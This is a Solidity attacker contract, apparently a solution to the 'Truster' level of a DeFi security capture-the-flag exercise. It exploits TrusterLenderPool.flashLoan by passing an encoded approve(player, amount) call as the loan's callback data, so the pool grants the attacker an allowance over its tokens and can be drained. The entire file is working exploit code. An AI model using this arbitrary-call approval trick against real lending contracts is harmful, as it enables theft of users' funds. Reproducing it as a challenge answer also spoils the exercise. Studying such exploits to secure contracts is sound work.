//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TrusterLenderPool.sol";

contract trusterattacker {
    constructor(){}

    function att (address pool,address token,address player,uint256 amount)public{
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",player,amount);
        TrusterLenderPool(pool).flashLoan(0, player,token, data);
        
    }

}